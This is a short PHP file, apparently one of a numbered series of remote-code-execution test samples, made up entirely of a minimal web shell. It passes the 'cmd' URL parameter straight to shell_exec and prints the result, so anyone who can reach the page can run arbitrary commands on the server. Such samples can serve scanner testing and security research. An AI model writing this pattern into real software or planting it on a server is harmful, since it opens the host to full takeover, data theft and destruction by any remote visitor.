<?php
// RCE test variation #427
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>